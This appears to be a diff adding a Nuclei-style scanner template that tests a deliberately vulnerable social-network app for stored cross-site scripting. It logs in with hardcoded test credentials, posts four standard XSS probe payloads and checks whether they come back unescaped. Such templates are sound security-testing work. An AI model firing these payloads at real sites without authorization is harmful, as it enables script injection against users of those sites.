@@ -1,0 +1,62 @@
+id: vuln-sns-posts-xss-stored
+info:
+  name: Vuln SNS Posts - Stored XSS
+  author: claude
+  severity: high
+  description: |
+    Tests for stored cross-site scripting vulnerabilities in posts content.
+  reference:
+    - https://owasp.org/www-community/attacks/xss/
+  tags: vuln-sns,xss,stored,posts
+
+variables:
+  rand_str: "{{rand_base(6)}}"
+
+http:
+  - raw:
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"user_id":"alice","password":"alice"}
+        
+      - |
+        POST /api/posts HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Authorization: Bearer {{token}}
+        
+        {"content":"{{payload}}_{{rand_str}}"}
+        
+      - |
+        GET /api/posts HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      payload:
+        - "<script>alert('XSS')</script>"
+        - "<img src=x onerror=alert('XSS')>"
+        - "<svg onload=alert('XSS')>"
+        - "<iframe src='javascript:alert(\"XSS\")'>"
+
+    extractors:
+      - type: regex
+        name: token
+        regex:
+          - '"token":\s*"([^"]+)"'
+        part: body_1
+        internal: true
+
+      - type: regex
+        name: post_id
+        regex:
+          - '"id":\s*(\d+)'
+        part: body_2
+        internal: true
+
+    matchers:
+      - type: word
+        words:
+          - "{{payload}}_{{rand_str}}"
+        part: body_3
